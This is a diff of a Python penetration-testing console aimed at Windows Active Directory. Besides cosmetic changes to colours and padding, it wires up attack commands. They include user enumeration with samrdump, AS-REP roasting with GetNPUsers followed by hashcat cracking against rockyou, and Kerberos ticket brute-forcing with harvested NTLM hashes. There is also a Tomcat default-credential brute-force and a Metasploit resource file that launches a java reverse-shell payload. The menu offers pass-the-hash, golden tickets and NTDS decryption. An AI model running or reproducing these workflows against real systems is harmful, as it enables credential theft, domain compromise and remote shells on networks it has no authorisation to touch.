@@ -123,10 +123,7 @@ def dotPadding(variable,value):
    variable = variable.rstrip("\n")
    variable = variable[:value] 
    while len(variable) < value:
-      if test == "":
-         variable += " "
-      else:
-         variable += "."
+      variable += "."
    return variable
 
 def getTime(value):
@@ -177,7 +174,12 @@ def display():
    else:
       print(colored(DNS[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[0],colour2), end=' ')
+   
+   if str(SHAR) == SHAR[0]:
+      print(colored(SHAR[0],colour5), end=' ')
+   else:
+      print(colored(SHAR[0],colour2), end=' ')
+   
    print('\u2551', end=' ')   
    if VALD[0] == "1":
       print(colored(USER[0],colour5), end=' ')
@@ -195,7 +197,12 @@ def display():
    else:
       print(colored(TIP[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[1],colour2), end=' ')
+   
+   if str(SHAR) == SHAR[1]:
+      print(colored(SHAR[1],colour5), end=' ')
+   else:
+      print(colored(SHAR[1],colour2), end=' ')
+   
    print('\u2551', end=' ')   
    if VALD[1] == "1":
       print(colored(USER[1],colour5), end=' ')
@@ -214,7 +221,12 @@ def display():
       lastChar = POR[COL1-1]
       print(colored(POR[:COL1-1],colour2) + colored(lastChar,colour4), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[2],colour2), end=' ')
+   
+   if str(SHAR) == SHAR[2]:
+      print(colored(SHAR[2],colour5), end=' ')
+   else:
+      print(colored(SHAR[2],colour2), end=' ')
+   
    print('\u2551', end=' ')   
    if VALD[2] == "1":
       print(colored(USER[2],colour5), end=' ')
@@ -232,7 +244,12 @@ def display():
    else:
       print(colored(WEB[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[3],colour2), end=' ')
+   
+   if str(SHAR) == SHAR[3]:
+      print(colored(SHAR[3],colour5), end=' ')
+   else:
+      print(colored(SHAR[3],colour2), end=' ')
+   
    print('\u2551', end=' ')   
    if VALD[3] == "1":
       print(colored(USER[3],colour5), end=' ')
@@ -250,7 +267,12 @@ def display():
    else:
       print(colored(USR[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[4],colour2), end=' ')
+   
+   if str(SHAR) == SHAR[4]:
+      print(colored(SHAR[4],colour5), end=' ')
+   else:
+      print(colored(SHAR[4],colour2), end=' ')
+   
    print('\u2551', end=' ')
    if VALD[4] == "1":
       print(colored(USER[4],colour5), end=' ')
@@ -268,7 +290,12 @@ def display():
    else:
       print(colored(PAS[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[5],colour2), end=' ')
+   
+   if str(SHAR) == SHAR[5]:
+      print(colored(SHAR[5],colour5), end=' ')
+   else:
+      print(colored(SHAR[5],colour2), end=' ')
+   
    print('\u2551', end=' ')   
    if VALD[5] == "1":
       print(colored(USER[5],colour5), end=' ')
@@ -286,7 +313,12 @@ def display():
    else:
       print(colored(NTM[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[6],colour2), end=' ')
+   
+   if str(SHAR) == SHAR[6]:
+      print(colored(SHAR[6],colour5), end=' ')
+   else:
+      print(colored(SHAR[6],colour2), end=' ')
+   
    print('\u2551', end=' ')   
    if VALD[6] == "1":
       print(colored(USER[6],colour5), end=' ')
@@ -304,7 +336,12 @@ def display():
    else:
       print(colored(DOM[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[7],colour2), end=' ')
+   
+   if str(SHAR) == SHAR[7]:
+      print(colored(SHAR[7],colour5), end=' ')
+   else:
+      print(colored(SHAR[7],colour2), end=' ')
+      
    print('\u2551', end=' ')   
    if VALD[7] == "1":
       print(colored(USER[7],colour5), end=' ')
@@ -322,7 +359,12 @@ def display():
    else:
       print(colored(SID[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[8],colour2), end=' ')
+   
+   if str(SHAR) == SHAR[8]:
+      print(colored(SHAR[8],colour5), end=' ')
+   else:
+      print(colored(SHAR[8],colour2), end=' ')
+   
    print('\u2551', end=' ')   
    if VALD[8] == "1":
       print(colored(USER[8],colour5), end=' ')
@@ -340,7 +382,12 @@ def display():
    else:
       print(colored(TSH[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[9],colour2), end=' ')
+   
+   if str(SHAR) == SHAR[9]:
+      print(colored(SHAR[9],colour5), end=' ')
+   else:
+      print(colored(SHAR[9],colour2), end=' ')
+      
    print('\u2551', end=' ')   
    if VALD[9] == "1":
       print(colored(USER[9],colour5), end=' ')
@@ -358,7 +405,12 @@ def display():
    else:
       print(colored(LTM[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[10],colour2), end=' ')
+   
+   if str(SHAR) == SHAR[10]:
+      print(colored(SHAR[10],colour5), end=' ')
+   else:
+      print(colored(SHAR[10],colour2), end=' ')
+   
    print('\u2551', end=' ')   
    if VALD[10] == "1":
       print(colored(USER[10],colour5), end=' ')
@@ -375,11 +427,16 @@ def display():
       print(colored(DIR[:COL1],colour1), end=' ')
    else:
       print(colored(DIR[:COL2],colour2), end=' ')
-   print('\u2551', end=' ')   
+   print('\u2551', end=' ')    
+   
    if SHAR[12][:1] != " ":
       print(colored(SHAR[11],'red'), end=' ')
    else:
-      print(colored(SHAR[11],colour2), end=' ')
+      if str(SHAR) == SHAR[10]:
+         print(colored(SHAR[11],colour5), end=' ')
+      else:
+         print(colored(SHAR[11],colour2), end=' ')
+      
    print('\u2551', end=' ')   
    if VALD[11] == "1":
       print(colored(USER[11],colour5), end=' ')
@@ -407,7 +464,7 @@ def options():
    print('\u2551' + "(6) Re/Set PASS WORD   (16) NMap LIVE PORTS    (26) SmbExec (36) Rpc Client     (46) Pass the HASH  (56) PSExec HASH (66) Editor HOST (76) RemoteSync (86) MSSQL   " + '\u2551')
    print('\u2551' + "(7) Re/Set NTLM HASH   (17) NMap PORT Services (27) WmiExec (37) Smb Client     (47) PasstheTicket  (57) SmbExecHASH (67) GoPhishing  (77) RSyncDumpS (87) MySQL   " + '\u2551')
    print('\u2551' + "(8) Re/Set DOMAIN NAME (18) NMap SubDOMAINS    (28) IfMap   (38) SmbMap SHARE   (48) Silver Ticket  (58) WmiExecHASH (68) GoBuster    (78) RDeskTop   (88) WinRm   " + '\u2551')
-   print('\u2551' + "(9) Re/Set DOMAIN SID  (19) NMAP SERVER TIME   (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) NTDSDecrypt (69) Nikto Scan  (79) XDesktop   (89) Exit    " + '\u2551')
+   print('\u2551' + "(9) Re/Set DOMAIN SID  (19) NMap SERVER TIME   (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) NTDSDecrypt (69) Nikto Scan  (79) XDesktop   (89) Exit    " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
 
 # -------------------------------------------------------------------------------------
@@ -535,8 +592,11 @@ else:
       
    for x in range (0, maximum):
       PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip(" ")
-      PASS[x] = spacePadding(PASS[x], COL4)
-
+      if USER[x][:1] == " ":
+         PASS[x] = spacePadding(PASS[x], COL4)
+      else:
+         PASS[x] = dotPadding(PASS[x], COL4)
+         
    for x in range(0, maximum):
       SHAR[x] = linecache.getline("shares.txt",x + 1).rstrip(" ")
       SHAR[x] = SHAR[x].lstrip()
@@ -720,7 +780,7 @@ while True:
          else:
             cleanUsers()							# WIPE CLEAN USERS AND PASSWORDS             
             
-            os.remove("usernames.txt")						# PURGE CURRENT USERFILE LIST
+            command("rm usernames.txt")						# PURGE CURRENT USERFILE LIST
             command("cat domusers.tmp | sort > sdomusers.tmp")			# TIDY NEW USER FILE FOR READING
             command("sed -i '/^$/d' sdomusers.tmp")
             
@@ -1360,9 +1420,12 @@ while True:
 
    if selection =='31':
       checkParams = testTwo(checkParams)
+      
+      if IP46 == "-6":
+         print(colored("[!] WARNING!! Not comptable with IP 6...", colour4))
 
       if checkParams != 1:
-         command(keypath + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -GUC --da --full")
+         command(keypath + "windapsearch.py -d " + DOM.rstrip(" ") + " --dc-ip " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -GUC --da --full")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1433,7 +1496,7 @@ while True:
          
             with open("users.tmp", "r") as read:
                for x in range(0, maximum):
-                  line1 = red.readline()                  
+                  line1 = read.readline()                  
                   if line1 != "":
                      try:
                         null,USER[x] = line1.split(DOM.rstrip(" ") + "\\")
@@ -1456,21 +1519,66 @@ while True:
 
    if selection =='33':
       checkParams = testTwo(checkParams)
+      
+#      test1 = os.path.getsize("usernames.txt")
+#      test2 = os.path.getsize("hashes.txt") 
+#      
+#      if test1 > 0:
+#         print(colored("[!] WARNING!!! - This command will overwrite the current USERNAMES file..", colour4))
+#         checkParams = 2
+#         
+#      if test2 > 0:
+#         print(colored("[!] WARNING!!! - This command will overwrite the current HASHES file..", colour4))
+#         checkParams = 2
+#         
+#      if checkParams == 2:
+#            testValue = input("[*] Please confirm that you wish to continue [Y] or [N] ")
+#            if testValue == "":
+#               testValue = "N"
+#            if testValue.upper() == "N":
+#               checkParams = 1
+#            else:
+#               checkParms = 0
 
       if checkParams != 1:
-         print("[*] Enumerating users, please wait this can take sometime...\n")
-                  
-         command(keypath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > users.tmp")
+         print("[*] Enumerating users, please wait this can take sometime...")
          
-         if os.path.getsize("users.tmp") != 0:
-            os.remove("usernames.txt") 
+         if NTM[:5] != "EMPTY":
+            print("[i] Using HASH value as password authentication...\n")
+            command(keypath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " > users.tmp")
+         else:
+            print("")
+            command(keypath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > users.tmp")
+                           
+         count = os.path.getsize("users.tmp")
+         
+         if count == 0:
+            print("[-] File users.tmp is empty...")
+            checkParams = 1
+         
+         with open("users.tmp", "r") as read:
+            for x in range(0, count):
+               line = read.readline()
+               if "[-] SMB SessionError:" in line:
+                  checkParams = 1
+                  command("cat users.tmp")
+                  break
+         read.close()
+        
+         if checkParams != 1:
+            command("rm usernames.txt")          
+            command("rm hashes.txt")                        
+            command("touch hashes.txt")
+            cleanUsers()
+            
+            command("rm tokens.txt")
+            command("touch tokens.txt")
+            cleanTokens()
                     
-            command("sed -i -n '/Found user: /p' USERS.tmp")		# SELECT ONLY FOUND USERS
-            command("cat USERS.tmp | sort > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
-            os.remove("USERS.tmp")
-            command("mv USERS2.tmp USERS.tmp")      
+            command("sed -i -n '/Found user: /p' users.tmp")		# SELECT ONLY FOUND USERS
+            command("cat users.tmp | sort > users2.tmp")		# SORT USERS ALPHANUMERICALLY 
 
-            with open("users.tmp", "r") as read:
+            with open("users2.tmp", "r") as read:
                for x in range (0, maximum):
                   USER[x] = read.readline()
                   
@@ -1483,15 +1591,16 @@ while True:
                      if USER[x] != "":
                        print(colored(USER[x],colour2))
                        command("echo " + USER[x] + " >> usernames.txt")		# ASSIGN USERS NAME
+                       PASS[x] = "."*COL4					# RESET PASSWORDS
                      else:
                         USER[x] = " "*COL3					# ASSIGN EMPTY USERS
                         PASS[x] = "."*COL4					# RESET PASSWORDS
                   else:
                      USER[x] = " "*COL3
                      PASS[x] = " "*COL4   
+            read.close()         
          else:
-            if USER[1][:1] == " ":
-               print ("[*] No entries were found...")
+            print ("[*] No entries were found...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1563,13 +1672,13 @@ while True:
             command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' > shares.tmp")
             
          if os.path.getsize("shares.tmp") != 0:
-            os.remove("shares.txt")
+            command("rm shares.txt")
          
             command("tput setaf 2")
             command("cat shares.tmp")
             command("tput sgr0")
          
-#            command("sed -i /'is an IPv6 address'/d shares.tmp")	# TIDY UP THE FILE READY FOR READING
+            command("sed -i /'is an IPv6 address'/d shares.tmp")	# TIDY UP THE FILE READY FOR READING
             command("sed -i /Sharename/d shares.tmp")
             command("sed -i /---------/d shares.tmp")
             command("sed -i '/^$/d' shares.tmp")
@@ -1608,7 +1717,7 @@ while True:
       checkParams = testTwo(checkParams)
       
       if IP46 == "-6":
-         print(colored("[!] WARNING!!! - Not compatable with IP6...",colour4))
+         print(colored("[!] WARNING!!! - Not compatable with IP 6...",colour4))
       
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
@@ -1650,7 +1759,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '40':
-      checkParams = checkTwo(checkParams)
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
@@ -1728,14 +1837,17 @@ while True:
          cleanUsers()
          cleanTokens()
          linecache.checkcache()
-         os.remove("tokens.txt")
+         command("rm tokens.txt")
             
          for x in range (0, maximum):
             USER[x] = linecache.getline("usernames.txt", x + 1).rstrip("\n")
             USER[x] = spacePadding(USER[x], COL3)
             
             PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip("\n")
-            PASS[x] = spacePadding(PASS[x], COL4)
+            if USER[x][:1] == " ":
+               PASS[x] = spacePadding(PASS[x], COL4)
+            else:
+               PASS[x] = dotPadding(PASS[x], COL4)
             
          count = len(open('rvalid.tmp').readlines())					# FIND OUT HOW MANY TO PROCESS                                  
          
@@ -1745,7 +1857,7 @@ while True:
             for y in range(0, maximum):
                checkuser2 = linecache.getline("usernames.txt", y + 1).rstrip("\n")
                if validname2 == checkuser2:	
-                  VALD[y] = 1								# ASSIGN A TOKEN TO THIS USER
+                  VALD[y] = "1"								# ASSIGN A TOKEN TO THIS USER
                   command("echo " + str(VALD[y]) + " >> tokens.txt")			# REMEMBER SETTINGS
                   
           	
@@ -1845,21 +1957,30 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='44':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo(checkParams)      
+
+      with open("usernames.txt", "r") as read:				# CREATE TEMPORARY AUTHORISED LIST
+         for x in range(0, maximum):
+            line = read.readline().rstrip("\n")
+            if VALD[x] == "1":
+               command("echo " + line + " >> authorised.tmp")
+      read.close()
+      
+      count = len(open('authorised.tmp').readlines())      
+      if count == 0:
+         print("[-] The authorised user file is empty...")
+         checkParams = 1
 
       if checkParams != 1:
-         if linecache.getline('usernames.txt', 1) != " ":
-            if NTM[:5] != "EMPTY":
-               print("[i] Using HASH value as password credential...")
-               command(keypath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile usernames.txt")
-            else:
-               command(keypath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile usernames.txt")
-               
-            print("[*] Cracking hash values if they exists...\n")
-            command("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.txt")
-            command("strings cracked2.txt")
+         if NTM[:5] != "EMPTY":
+            print("[i] Using HASH value as password credential...")
+            command(keypath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")
          else:
-            print("[-] The file usernames.txt is empty...")
+            command(keypath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")
+            
+         print("[*] Cracking hash values if they exists...\n")
+         command("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.txt")
+         command("strings cracked2.txt")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1926,10 +2047,22 @@ while True:
             
             if count > 0:
                print("[*] Please wait, bruteforcing using " + str(count) + " found hashes...")
+               
+               counter = 1
+               marker1 = 0
+               marker2 = 0
+               marker3 = 0
+               if count > 50:
+                  marker = count/4
+                  marker = int(round(marker))
+                  marker1 = marker
+                  marker2 = marker * 2
+                  marker3 = marker * 3                  
 
                with open("hashes.txt", "r") as read:
                   for line in read:
                      line = line.rstrip("\n")
+                     counter = counter + 1
                      command(keypath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + line.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " > log2.tmp")
 
                      command("sed -i '1d' log2.tmp")
@@ -1950,8 +2083,18 @@ while True:
                         print("[-] Clock skew too great, terminating...")
                         checkParams = 2
                         break
+                        
+                     if marker1 == counter:
+                        print("[i] 25% completed...")
+                        
+                     if marker2 == counter:
+                        print("[i] 50% completed...")
+                        
+                     if marker3 == counter:
+                        print("[i] 75% completed...")                        
+                        
                if checkParams != 2:
-                  print("[-] Hashes.txt exhausted...")
+                  print("[-] 100% complete - exhausted!!...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2749,8 +2892,8 @@ while True:
       else:
          print("[*] Attempting a tomcat bruteforce on the specified web address, please wait...")
          
-         os.remove("usernames.txt")
-         os.remove("passwords.txt")
+         command("rm usernames.txt")
+         command("rm passwords.txt")
          
          with open('/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt', 'r') as userpasslist:
             for line in userpasslist:
@@ -2800,14 +2943,14 @@ while True:
       command("echo 'set payload java/shell_reverse_tcp' >> meterpreter.rc")
       command("hostname -I >> temp.tmp")
       target = linecache.getline("temp.tmp",1)
-      os.remove("temp.tmp")
+      command("rm temp.tmp")
       one, two, three, four = target.split(" ")
       target = two.rstrip(" ")
       command("echo 'set lhost " + target + "' >> meterpreter.rc")
       command("echo 'run' >> meterpreter.rc")
       command("msfconsole -r meterpreter.rc")
       prompt() 
-      os.remove("meterpreter.rc")  
+      command("rm meterpreter.rc")  
            
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -3026,7 +3169,7 @@ while True:
 
    if selection == '89':
       if os.path.exists("config.txt"):
-         os.remove("config.txt")				# DELETE OLD CONFIG FILE
+         command("rm config.txt")				# DELETE OLD CONFIG FILE
          
       command("echo " + DNS + " >> config.txt")
       command("echo " + TIP + " >> config.txt")
